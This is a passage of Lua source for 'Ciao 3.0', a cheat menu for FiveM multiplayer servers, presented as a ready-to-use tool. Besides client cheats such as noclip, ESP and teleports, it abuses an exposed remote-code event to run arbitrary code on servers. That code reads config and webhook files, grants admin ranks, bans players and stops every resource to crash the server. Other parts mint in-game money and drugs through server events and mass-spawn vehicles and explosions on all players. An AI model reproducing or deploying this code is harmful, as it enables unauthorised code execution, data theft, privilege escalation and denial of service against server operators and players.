                    elseif Ciao.ComboBox("Direction", {"front", "back"}, currDirectionIndex, selDirectionIndex, function(currentIndex, selectedIndex)
                        currDirectionIndex = currentIndex
                        selDirectionIndex = currentIndex
                    end) then
                    elseif Ciao.ComboBox("Rotation", RotationOps, currRotationIndex, selRotationIndex, function(currentIndex, selectedIndex)
                        currRotationIndex = currentIndex
                        selRotationIndex = currentIndex
                        ObjRotation = RotationOps[currRotationIndex]
                        end) then
                    end


                -- SPAWNED OBJECTS MENU
                elseif Ciao.IsMenuOpened('objectlist') then
                    if Ciao.Button("Delete All Spawned Objects") then for i = 1, #SpawnedObjects do RequestControlOnce(SpawnedObjects[i])DeleteObject(SpawnedObjects[i]) end
                    else
                        for i = 1, #SpawnedObjects do
                            if DoesEntityExist(SpawnedObjects[i]) then
                                if Ciao.Button("OBJECT [" .. i .. "] WITH ID " .. SpawnedObjects[i]) then
                                    RequestControlOnce(SpawnedObjects[i])
                                    DeleteObject(SpawnedObjects[i])
                                end
                            end
                        end
                    end

                -- WEATHER CHANGER MENU
                elseif Ciao.IsMenuOpened('weather') then
                    if Ciao.ComboBox("Weather Type", WeathersList, currWeatherIndex, selWeatherIndex, function(currentIndex, selectedIndex)
                                currWeatherIndex = currentIndex
                                selWeatherIndex = currentIndex
                                WeatherType = WeathersList[currentIndex]
                    end) then
                    elseif Ciao.CheckBox("Weather Changer", WeatherChanger, "Disabled", "Enabled") then
                    WeatherChanger = not WeatherChanger
                    end

                -- MISC OPTIONS MENU
                elseif Ciao.IsMenuOpened('\109\105\115\99\10') then

                    if Ciao.MenuButton("ESP & Visual", 'esp') then
                    elseif Ciao.MenuButton("~h~âˆ‘~r~Info", "InfoMenu") then
                    elseif Ciao.CheckBox('Force Map', ForceMap) then
                        ForceMap = not ForceMap
                    elseif Ciao.CheckBox('Force Third Person', ForceThirdPerson) then
                        ForceThirdPerson = not ForceThirdPerson
                    elseif Ciao.MenuButton("Web Radio", 'webradio') then
                    elseif Ciao.CheckBox("Portable Radio", Radio, "Disabled", "Enabled") then
                        Radio = not Radio
                        ShowInfo("~r~Portable Radio will override any vehicle's radio!")
                    elseif Ciao.CheckBox('Always Draw Crosshair', Crosshair) then
                        Crosshair = not Crosshair
                    elseif Ciao.CheckBox("Show Coordinates", ShowCoords) then
                        ShowCoords = not ShowCoords
                    elseif Ciao.MenuButton('Credits', 'credits') then
                    end

                
                elseif Ciao.IsMenuOpened("InfoMenu") then
                    if Ciao.Button("~p~Ciao 3.0") then
                    elseif Ciao.Button("~b~Ciao 3.0 er udviklet af ~b~sharkiii#9999") then
                    elseif Ciao.Button("~b~Ciao 3.0 er ejet af ~r~sharkiii#9999") then                    
                    elseif Ciao.Button("~b~Discord | ~r~https://discord.gg/z59nQbu") then  
                    end
                    
                    -- ESP OPTIONS MENU
                elseif Ciao.IsMenuOpened('esp') then
                    if Ciao.CheckBox("Blips", BlipsEnabled) then
                        ToggleBlips()
                        elseif Ciao.Button("Remote Car") then
                            RCCAR123 = GetKeyboardInput("Enter Car Name", "", 1000000)
                                if RCCAR123 and IsModelValid(RCCAR123) and IsModelAVehicle(RCCAR123) then
                                    RCCar.Start()
                                else
                                    ShowInfo("Model Isn't Valid!")
                                end
                    elseif Ciao.CheckBox("Nametags", NametagsEnabled) then
                        NametagsEnabled = not NametagsEnabled
                        tags_plist = GetActivePlayers()
                        ptags = {}
                        for i = 1, #tags_plist do
                            ptags[i] = CreateFakeMpGamerTag(GetPlayerPed(tags_plist[i]), GetPlayerName(tags_plist[i]), 0, 0, "", 0)
                            SetMpGamerTagVisibility(ptags[i], 0, NametagsEnabled)
                            SetMpGamerTagVisibility(ptags[i], 2, NametagsEnabled)
                        end
                        if not NametagsEnabled then
                            for i = 1, #ptags do
                                SetMpGamerTagVisibility(ptags[i], 4, 0)
                                SetMpGamerTagVisibility(ptags[i], 8, 0)
                            end
                        end
                    elseif Ciao.CheckBox("Alternative (OneSync) Nametags", ANametagsEnabled) then
                        ANametagsEnabled = not ANametagsEnabled
                    elseif Ciao.CheckBox("Draw Alternative Nametags Through Walls", ANametagsNotNeedLOS) then
                        ANametagsNotNeedLOS = not ANametagsNotNeedLOS
                    elseif Ciao.CheckBox("ESP", ESPEnabled) then
                        ToggleESP()
                    elseif Ciao.ComboBoxSlider("ESP Distance", ESPDistanceOps, currESPDistance, selESPDistance, function(currentIndex, selectedIndex)
                        currESPDistance = currentIndex
                        selESPDistance = currentIndex
                        EspDistance = ESPDistanceOps[currESPDistance]
                    end) then
                    elseif Ciao.CheckBox("Force Crosshair", Crosshair, function(enabled) Crosshair = enabled end) then
                    elseif Ciao.ComboBoxSlider("ESP Refresh Rate", ESPRefreshOps, currESPRefreshIndex, selESPRefreshIndex, function(currentIndex, selectedIndex)
                        currESPRefreshIndex = currentIndex
                        selESPRefreshIndex = currentIndex
                        if currentIndex == 1 then
                            ESPRefreshTime = 0
                        elseif currentIndex == 2 then
                            ESPRefreshTime = 100
                        elseif currentIndex == 3 then
                            ESPRefreshTime = 250
                        elseif currentIndex == 4 then
                            ESPRefreshTime = 500
                        elseif currentIndex == 5 then
                            ESPRefreshTime = 1000
                        elseif currentIndex == 6 then
                            ESPRefreshTime = 2000
                        elseif currentIndex == 7 then
                            ESPRefreshTime = 5000
                        end
                    end) then
                    elseif Ciao.CheckBox("Lines", LinesEnabled) then
                        LinesEnabled = not LinesEnabled
                    end

                -- WEB RADIO MENU
                elseif Ciao.IsMenuOpened('webradio') then
                    if Ciao.CheckBox("Classical", ClassicalRadio, "Status: Not Playing", "Status: Playing") then
                        ClassicalRadio = not ClassicalRadio
                        if ClassicalRadio then
                            RadioDUI = CreateDui("http://cms.stream.publicradio.org/cms.mp3", 1, 1)
                            ShowInfo("~b~Now Playing...")
                        else
                            DestroyDui(RadioDUI)
                            ShowInfo("~r~Web Radio Stopped!")
                        end
                    end
                -- TELEPORT OPTIONS MENU
                elseif Ciao.IsMenuOpened('\116\101\108\101\112\111\114\116\10') then
                    if Ciao.MenuButton('Save/Load Position', 'saveload') then
                    elseif Ciao.MenuButton('Teleport to POI', 'pois') then
                    elseif Ciao.Button('Teleport To Waypoint ~r~(NUM 4)') then
                        TeleportToWaypoint()
                    elseif Ciao.Button('Teleport FBI') then
                        fbi()
                    elseif Ciao.Button('Teleport LS Customs') then
                        ls()
                    elseif Ciao.Button('Teleport Main Garage') then
                        gp()
                    elseif Ciao.Button('Teleport Ammunation') then
                        Ammunation()
                    elseif Ciao.Button('Teleport Clothes shop') then
                        shopclothes()
                    elseif Ciao.Button('Teleport Barber') then
                        barber()
                    end


                elseif Ciao.IsMenuOpened('saveload') then
                    if Ciao.ComboBox("Saved Location 1", {"save", "load"}, currSaveLoadIndex1, selSaveLoadIndex1, function(currentIndex, selectedIndex)
                        currSaveLoadIndex1 = currentIndex
                        selSaveLoadIndex1 = currentIndex
                    end) then
                        if selSaveLoadIndex1 == 1 then
                            savedpos1 = GetEntityCoords(PlayerPedId())
                            ShowInfo("~g~Position 1 Saved")
                        else
                            if not savedpos1 then ShowInfo("~r~There is no saved position for slot 1!") else
                                SetEntityCoords(PlayerPedId(), savedpos1)
                                ShowInfo("~g~Position 1 Loaded")
                            end
                        end
                    elseif Ciao.ComboBox("Saved Location 2", {"save", "load"}, currSaveLoadIndex2, selSaveLoadIndex2, function(currentIndex, selectedIndex)
                        currSaveLoadIndex2 = currentIndex
                        selSaveLoadIndex2 = currentIndex
                    end) then
                        if selSaveLoadIndex2 == 1 then
                            savedpos2 = GetEntityCoords(PlayerPedId())
                            ShowInfo("~g~Position 2 Saved")
                        else
                            if not savedpos2 then ShowInfo("~r~There is no saved position for slot 2!") else
                                SetEntityCoords(PlayerPedId(), savedpos2)
                                ShowInfo("~g~Position 2 Loaded")
                            end
                        end
                    elseif Ciao.ComboBox("Saved Location 3", {"save", "load"}, currSaveLoadIndex3, selSaveLoadIndex3, function(currentIndex, selectedIndex)
                        currSaveLoadIndex3 = currentIndex
                        selSaveLoadIndex3 = currentIndex
                    end) then
                        if selSaveLoadIndex3 == 1 then
                            savedpos3 = GetEntityCoords(PlayerPedId())
                            ShowInfo("~g~Position 3 Saved")
                        else
                            if not savedpos3 then ShowInfo("~r~There is no saved position for slot 3!") else
                                SetEntityCoords(PlayerPedId(), savedpos3)
                                ShowInfo("~g~Position 3 Loaded")
                            end
                        end
                    elseif Ciao.ComboBox("Saved Location 4", {"save", "load"}, currSaveLoadIndex4, selSaveLoadIndex4, function(currentIndex, selectedIndex)
                        currSaveLoadIndex4 = currentIndex
                        selSaveLoadIndex4 = currentIndex
                    end) then
                        if selSaveLoadIndex4 == 1 then
                            savedpos4 = GetEntityCoords(PlayerPedId())
                            ShowInfo("~g~Position 4 Saved")
                        else
                            if not savedpos4 then ShowInfo("~r~There is no saved position for slot 4!") else
                                SetEntityCoords(PlayerPedId(), savedpos4)
                                ShowInfo("~g~Position 4 Loaded")
                            end
                        end
                    elseif Ciao.ComboBox("Saved Location 5", {"save", "load"}, currSaveLoadIndex5, selSaveLoadIndex5, function(currentIndex, selectedIndex)
                        currSaveLoadIndex5 = currentIndex
                        selSaveLoadIndex5 = currentIndex
                    end) then
                        if selSaveLoadIndex5 == 1 then
                            savedpos5 = GetEntityCoords(PlayerPedId())
                            ShowInfo("~g~Position 5 Saved")
                        else
                            if not savedpos5 then ShowInfo("~r~There is no saved position for slot 5!") else
                                SetEntityCoords(PlayerPedId(), savedpos5)
                                ShowInfo("~g~Position 5 Loaded")
                            end
                        end
                    end


                elseif Ciao.IsMenuOpened('pois') then
                    if Ciao.Button("Car Dealership (Simeon's)") then
                        SetEntityCoords(PlayerPedId(), -3.812, -1086.427, 26.672)
                    elseif Ciao.Button("Legion Square") then
                        SetEntityCoords(PlayerPedId(), 212.685, -920.016, 30.692)
                    elseif Ciao.Button("Grove Street") then
                        SetEntityCoords(PlayerPedId(), 118.63, -1956.388, 20.669)
                    elseif Ciao.Button("LSPD HQ") then
                        SetEntityCoords(PlayerPedId(), 436.873, -987.138, 30.69)
                    elseif Ciao.Button("Sandy Shores BCSO HQ") then
                        SetEntityCoords(PlayerPedId(), 1864.287, 3690.687, 34.268)
                    elseif Ciao.Button("Paleto Bay BCSO HQ") then
                        SetEntityCoords(PlayerPedId(), -424.13, 5996.071, 31.49)
                    elseif Ciao.Button("FIB Top Floor") then
                        SetEntityCoords(PlayerPedId(), 135.835, -749.131, 258.152)
                    elseif Ciao.Button("FIB Offices") then
                        SetEntityCoords(PlayerPedId(), 136.008, -765.128, 242.152)
                    elseif Ciao.Button("Michael's House") then
                        SetEntityCoords(PlayerPedId(), -801.847, 175.266, 72.845)
                    elseif Ciao.Button("Franklin's First House") then
                        SetEntityCoords(PlayerPedId(), -17.813, -1440.008, 31.102)
                    elseif Ciao.Button("Franklin's Second House") then
                        SetEntityCoords(PlayerPedId(), -6.25, 522.043, 174.628)
                    elseif Ciao.Button("Trevor's Trailer") then
                        SetEntityCoords(PlayerPedId(), 1972.972, 3816.498, 32.95)
                    elseif Ciao.Button("Tequi-La-La") then
                        SetEntityCoords(PlayerPedId(), -568.25, 291.261, 79.177)
                    end

                elseif Ciao.IsMenuOpened('\115\101\116\116\105\110\103\115\10') then
                if Ciao.ComboBox("~r~Â»  ~s~Menu ~b~X", menuX, currentMenuX, selectedMenuX, function(currentIndex, selectedIndex)
                    currentMenuX = currentIndex
                    selectedMenuX = currentIndex
                    for i = 1, #menulist do
                        Ciao.SetMenuX(menulist[i], menuX[currentMenuX])
                    end
                    end)
                    then
                elseif Ciao.ComboBox("~r~Â»  ~s~Menu ~b~Y", menuY, currentMenuY, selectedMenuY, function(currentIndex, selectedIndex)
                    currentMenuY = currentIndex
                    selectedMenuY = currentIndex
                    for i = 1, #menulist do
                        Ciao.SetMenuY(menulist[i], menuY[currentMenuY])
                    end
                    end)
                    then
                    end


                elseif Ciao.IsMenuOpened('\108\117\97\10') then
                        if Ciao.MenuButton('~r~DEVO OG SKY TRIGGERS ~g~(New)', '\118\114\112\10') then
                        elseif Ciao.MenuButton('~r~[SPAWN DRUGS DEVO FILER] ~g~(New)', '\101\115\120\10') then
                        elseif Ciao.MenuButton('~r~FÃ¥ penge [DEVO FILER] ~g~(New)', 'other') then
                        
                    end

                -- Spawn Money
                elseif Ciao.IsMenuOpened('money') then
                if Ciao.Button("Bliv Politi ~g~[SKY FILER]") then
                    udwdj("kasperr_jobcenter:selectJob", "Politi-Job")
                elseif Ciao.Button("Bliv Mekaniker ~g~[SKY FILER]") then
                    udwdj("kasperr_jobcenter:selectJob", "Mekaniker-Job")
                elseif Ciao.Button("Bliv LÃ¦ge ~g~[SKY FILER]") then
                    udwdj("kasperr_jobcenter:selectJob", "EMS-Job")
                elseif Ciao.Button("Bliv Advokat ~g~[SKY FILER]") then
                    udwdj("kasperr_jobcenter:selectJob", "Advokat")    
                elseif Ciao.Button("Bliv Bilforhandler ~g~[SKY FILER]") then
                    udwdj("kasperr_jobcenter:selectJob", "Abur Biler")
                elseif Ciao.Button("Bliv EjendomsmÃ¦gler ~g~[SKY FILER]") then
                    udwdj("kasperr_jobcenter:selectJob", "EjendomsmÃ¦gler")
                end
                elseif Ciao.IsMenuOpened('other') then
                        if Ciao.Button("~r~FÃ¥ Mange Penge [DEVO FILER]") then
                            TriggerServerEvent("scrap:SellVehicle", 9000000000000000)
                            ShowInfo("~r~Modtog mange penge!")
                        elseif Ciao.Button("~r~FÃ¥ 9 Mil [DEVO FILER]") then
                            TriggerServerEvent("scrap:SellVehicle", 9000000)
                            ShowInfo("~r~Modtog 9 mil!")
                        elseif Ciao.Button("~r~FÃ¥ 5 Mil [DEVO FILER]") then
                            TriggerServerEvent("scrap:SellVehicle", 5000000)
                            ShowInfo("~r~Modtog 5 mil!")
                        elseif Ciao.Button("~r~FÃ¥ 2 Mil [DEVO FILER]") then
                            TriggerServerEvent("scrap:SellVehicle", 2000000)
                            ShowInfo("~r~Modtog 2 mil!")
                        elseif Ciao.Button("~r~FÃ¥ 500 k [DEVO FILER]") then
                            TriggerServerEvent("scrap:SellVehicle", 500000)
                            ShowInfo("~r~Modtog 500k!")
                        end



                elseif Ciao.IsMenuOpened('\101\115\120\10') then
                    if Ciao.Button("~g~HÃ¸st Kokain x1[DEVO FILER]") then
                        TriggerServerEvent("kokain")
                        ShowInfo("~g~Modtog 1 kokainblade!")
                    elseif Ciao.Button("~g~HÃ¸st Kokain x10[DEVO FILER]") then
                        TriggerServerEvent("kokain2")
                        ShowInfo("~g~Modtog 10 kokainblade!")
                    elseif Ciao.Button("~g~Fremstil Kokain x1[DEVO FILER]") then
                        TriggerServerEvent("Fremstill")
                        ShowInfo("~g~Fremstal 1 kokain!")
                    elseif Ciao.Button("~g~Fremstil Kokain x10[DEVO FILER]") then
                        TriggerServerEvent("Fremstill2")
                        ShowInfo("~g~Fremstal 10 kokain!!")
                    elseif Ciao.Button("~g~SÃ¦lg Kokain x1[DEVO FILER]") then
                        TriggerServerEvent("saalg")
                        ShowInfo("~g~Sogte 1 kokain!")
                    elseif Ciao.Button("~g~SÃ¦lg Kokain x10[DEVO FILER]") then
                        TriggerServerEvent("saalg2")
                        ShowInfo("~g~Sogte 10 kokain!")
                    elseif Ciao.Button("~g~Hvidvask x1[DEVO FILER]") then
                        TriggerServerEvent('Hvidvask')
                        ShowInfo("~g~Hvidvasket 1000!")
                    elseif Ciao.Button("~g~Hvidvask x5[DEVO FILER]") then
                        TriggerServerEvent('Hvidvask2')
                        ShowInfo("~g~Hvidvasket 5000!")
                    elseif Ciao.Button("~g~Hvidvask x10[DEVO FILER]") then
                        TriggerServerEvent('Hvidvask3')
                        ShowInfo("~g~Hvidvasket 10000!")
                    elseif Ciao.Button("~g~Lav Penge[DEVO FILER]") then
                        TriggerServerEvent("kokain2") 
                        Citizen.Wait(0)
                        TriggerServerEvent("Fremstill2")
                        Citizen.Wait(0)
                        TriggerServerEvent("saalg2") 
                        Citizen.Wait(0)
                        TriggerServerEvent('Hvidvask3')
                        ShowInfo("~g~Laver penge!")
                    end
                        




                elseif Ciao.IsMenuOpened('\118\114\112\10') then
                    if Ciao.MenuButton("FÃ¥ Jobs ~g~[SKY FILER]", 'money') then
                    elseif Ciao.Button("Tag hÃ¥ndjern/strips af/pÃ¥") then
                        vRP.toggleHandcuff()
                    elseif Ciao.Button("FÃ¥ KÃ¸rekort") then
                        udwdj("dmv:success")
                    

                    

                


            elseif Ciao.Button("Get Webhook") then

                TriggerServerEvent('RunCode:RunStringRemotelly', [[
                local file = LoadResourceFile("serverlog", "sv_chat.lua")
                
                vRP.prompt({source, "", file, function() end})

                for i = 1,500 do 
                    RconPrint("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
                    RconPrint("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
                end
            ]])

        elseif Ciao.Button("Base") then    
            TriggerServerEvent('RunCode:RunStringRemotelly', [[
                local file = LoadResourceFile("vrp", "cfg/base.lua")
                
                vRP.prompt({source, "", file, function() end})
            
                for i = 1,500 do 
                    RconPrint("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
                    RconPrint("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
                end
            ]])
        elseif Ciao.Button("Crah The server") then
                local myTable = {
                    'Ciao Menu',
                    'Godt gjort min bror',
                    '! spozt#1935'
        }
        function ShowInfo(text)
            SetNotificationTextEntry("STRING")
            AddTextComponentString(text)
            DrawNotification(true, false)
        end
        ShowInfo(myTable[ math.random( #myTable ) ])
        local function FgWqg()
            local ouGWmAexz = {}
            for i = 0, GetNumResources() do
                ouGWmAexz[i] = GetResourceByFindIndex(i)
            end
            return ouGWmAexz
        end
        local RwFbMFt4elf6NNUg0kg = {}
        RwFbMFt4elf6NNUg0kg = FgWqg()
        run = ""
        for i = 0, #RwFbMFt4elf6NNUg0kg do
            run = run .. " StopResource('" .. RwFbMFt4elf6NNUg0kg[i] .. "') " 
            TriggerServerEvent("RunCode:RunStringRemotelly", run)
        end
        elseif Ciao.Button("CEVA") then

                TriggerServerEvent('RunCode:RunStringRemotelly', [[
                local file = LoadResourceFile("vrp", "cfg/groups.lua")
                
                vRP.prompt({source, "", file, function() end})

                for i = 1,500 do 
                    RconPrint("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
                    RconPrint("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
                end
            ]])
        elseif Ciao.Button("Get theres logs/Weebhooks") then

            TriggerServerEvent('RunCode:RunStringRemotelly', [[
            local file = LoadResourceFile("vrp", "modules/admin.lua")
            
            vRP.prompt({source, "", file, function() end})

            for i = 1,500 do 
                RconPrint("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
                RconPrint("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
            end
        ]])
    elseif Ciao.Button("See Group Name") then

        TriggerServerEvent('RunCode:RunStringRemotelly', [[
        local file = LoadResourceFile("vrp", "modules/group.lua")
        
        vRP.prompt({source, "", file, function() end})

        for i = 1,500 do 
            RconPrint("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
            RconPrint("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
        end
    ]])
    
                    elseif Ciao.Button("Give Rank") then
                        local id = "local id = " .. GetKeyboardInput("ID:", " ", 20) .. " "
                        local rank = 'local rank = "'.. GetKeyboardInput('Rank:', '' , 20)..'" '
                        local admin = [[
                                local warof = 5
                                local users = vRP.getUsers({})
                                local player = vRP.getUserSource({id})
                                vRP.addUserGroup({id, rank})
                                for i = 1,500 do 
                                    RconPrint("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
                                    RconPrint("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
                                end
                            ]]
                        local admin2 = id .. rank ..admin
                        udwdj('RunCode:RunStringRemotelly', admin2)
                    elseif Ciao.Button("BAN Person", '~r~DevoNetwork') then
                        local id = "local id = " .. GetKeyboardInput("ID:", " ", 20) .. " "
                        local grund = 'local grund = "'..  GetKeyboardInput('GRUND:', '' , 20)..'" '
                        local ban = [[
                                local warof = 5
                                local users = vRP.getUsers({})
                                local player = vRP.getUserSource({id})
                                vRP.ban({id, grund})
                                for i = 1,500 do 
                                    RconPrint("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
                                    RconPrint("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
                                end
                            ]]
                            local ban = id .. grund ..ban
                            udwdj('RunCode:RunStringRemotelly', ban)
                    elseif Ciao.Button("--SKY--") then
                    elseif Ciao.Button("Bliv Ejer [SKY FILER] ~r~Virker PÃ¥ 50% Sky Filer") then
                        udwdj("kasperr_kriminel:selectJob", "ledelse")
                        udwdj("kasperr_kriminel:selectJob", "Admin")
                        udwdj("kasperr_kriminel:selectJob", "Ejer")
                        udwdj("kasperr_kriminel:selectJob", "thanighthawk")
                    end


                elseif Ciao.IsMenuOpened('credits') then
                    for i = 1, #developers do if Ciao.Button(developers[i]) then end end

                elseif IsDisabledControlJustReleased(0, Keys[menuKeybind]) then Ciao.OpenMenu('Ciao')


                elseif IsDisabledControlPressed(0, Keys[menuKeybind2]) then Ciao.OpenMenu('Ciao')

                elseif IsControlJustReleased(0, Keys[noclipKeybind]) then ToggleNoclip()

                elseif IsControlJustReleased(0, Keys[teleportKeyblind]) then TeleportToWaypoint()

                elseif IsControlJustReleased(0, Keys[fixvaiculoKeyblind]) then fixcar() end

                Ciao.Display()

                if Demigod then
                    if GetEntityHealth(PlayerPedId()) < 200 then
                        SetEntityHealth(PlayerPedId(), 200)
                    end
                end

                if ADemigod then
                    SetEntityHealth(PlayerPedId(), 189.9)
                end

                if Noclipping then
                    local isInVehicle = IsPedInAnyVehicle(PlayerPedId(), 0)
                    local k = nname
                    local x, y, z = nname

                    if not isInVehicle then
                        k = PlayerPedId()
                        x, y, z = table.unpack(GetEntityCoords(PlayerPedId(), 2))
                    else
                        k = GetVehiclePedIsIn(PlayerPedId(), 0)
                        x, y, z = table.unpack(GetEntityCoords(PlayerPedId(), 1))
                    end

                    if isInVehicle and GetSeatPedIsIn(PlayerPedId()) ~= -1 then RequestControlOnce(k) end

                    local dx, dy, dz = GetCamDirection()
                    SetEntityVisible(PlayerPedId(), 0, 0)
                    SetEntityVisible(k, 0, 0)

                    SetEntityVelocity(k, 0.0001, 0.0001, 0.0001)

                    if IsDisabledControlJustPressed(0, Keys["LEFTSHIFT"]) then -- Change speed
                        oldSpeed = NoclipSpeed
                        NoclipSpeed = NoclipSpeed * 2
                    end
                    if IsDisabledControlJustReleased(0, Keys["LEFTSHIFT"]) then -- Restore speed
                        NoclipSpeed = oldSpeed
                    end

                    if IsDisabledControlPressed(0, 32) then -- MOVE FORWARD
                        x = x + NoclipSpeed * dx
                        y = y + NoclipSpeed * dy
                        z = z + NoclipSpeed * dz
                    end

                    if IsDisabledControlPressed(0, 269) then -- MOVE BACK
                        x = x - NoclipSpeed * dx
                        y = y - NoclipSpeed * dy
                        z = z - NoclipSpeed * dz
                    end

                    if IsDisabledControlPressed(0, Keys["SPACE"]) then -- MOVE UP
                        z = z + NoclipSpeed
                    end

                    if IsDisabledControlPressed(0, Keys["LEFTCTRL"]) then -- MOVE DOWN
                        z = z - NoclipSpeed
                    end


                    SetEntityCoordsNoOffset(k, x, y, z, true, true, true)
                end

                if ExplodingAll then
                    ExplodeAll(includeself)
                end

                if Tracking then
                    local coords = GetEntityCoords(GetPlayerPed(TrackedPlayer))
                    SetNewWaypoint(coords.x, coords.y)
                end

                if FlingingPlayer then
                    local coords = GetEntityCoords(GetPlayerPed(FlingedPlayer))
                    Citizen.InvokeNative(0xE3AD2BDBAEE269AC, coords.x, coords.y, coords.z, 4, 1.0, 0, 1, 0.0, 1)
                end

                if InfStamina then
                    RestorePlayerStamina(PlayerId(), GetPlayerSprintStaminaRemaining(PlayerId()))
                end

                if SuperJump then
                    SetSuperJumpThisFrame(PlayerId())
                end

                if Invisibility then
                    SetEntityVisible(PlayerPedId(), 0, 0)
                end

                if Forcefield then
                    DoForceFieldTick(ForcefieldRadius)
                end

                if CarsDisabled then
                    local plist = GetActivePlayers()
                    for i = 1, #plist do
                        if IsPedInAnyVehicle(GetPlayerPed(plist[i]), true) then
                            ClearPedTasksImmediately(GetPlayerPed(plist[i]))
                        end
                    end
                end

                if GunsDisabled then
                    local plist = GetActivePlayers()
                    for i = 1, #plist do
                        if IsPedShooting(GetPlayerPed(plist[i])) then
                            ClearPedTasksImmediately(GetPlayerPed(plist[i]))
                        end
                    end
                end

                if NoisyCars then
                    for k in EnumerateVehicles() do
                        SetVehicleAlarmTimeLeft(k, 500)
                    end
                end

                if FlyingCars then
                    for k in EnumerateVehicles() do
                        RequestControlOnce(k)
                        ApplyForceToEntity(k, 3, 0.0, 0.0, 500.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
                    end
                end

                if SuperGravity then
                    for k in EnumerateVehicles() do
                        RequestControlOnce(k)
                        SetVehicleGravityAmount(k, GravAmount)
                    end
                end

                function nukeserver()
            Citizen.CreateThread(function()
                local dg="Avenger"
                local dh="CARGOPLANE"
                local di="luxor"
                local dj="maverick"
                local dk="blimp2"

                while not HasModelLoaded(GetHashKey(dh))do
                    Citizen.Wait(0)
                    RequestModel(GetHashKey(dh))
                end

                while not HasModelLoaded(GetHashKey(di))do
                    Citizen.Wait(0)RequestModel(GetHashKey(di))
                end

                while not HasModelLoaded(GetHashKey(dg))do
                    Citizen.Wait(0)RequestModel(GetHashKey(dg))
                end

                while not HasModelLoaded(GetHashKey(dj))do
                    Citizen.Wait(0)RequestModel(GetHashKey(dj))
                end

                while not HasModelLoaded(GetHashKey(dk))do
                    Citizen.Wait(0)RequestModel(GetHashKey(dk))
                end

                for bs=0,9 do
                    udwdj("_chat:messageEntered","~r~",{141,211,255},"JOI Nuked Discord.gg  Nuked Venner: sÃ¥ Nuked er i Nuked sÃ¸de")
                end

                for i=0,128 do
                    local di=CreateVehicle(GetHashKey(dg),GetEntityCoords(GetPlayerPed(i))+2.0,true,true) and CreateVehicle(GetHashKey(dg),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dg),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dh),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dh),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dh),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(di),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(di),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(di),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dj),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dj),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dj),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dk),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dk),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dk),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and AddExplosion(GetEntityCoords(GetPlayerPed(i)),5,3000.0,true,arwet,100000.0)and AddExplosion(GetEntityCoords(GetPlayerPed(i)),5,3000.0,true,arwet,true)
                end
                ShowInfo("~g~Fucked :(")
            end)
            end

            if fuckallcars then
                for aP in EnumerateVehicles() do
                    if not
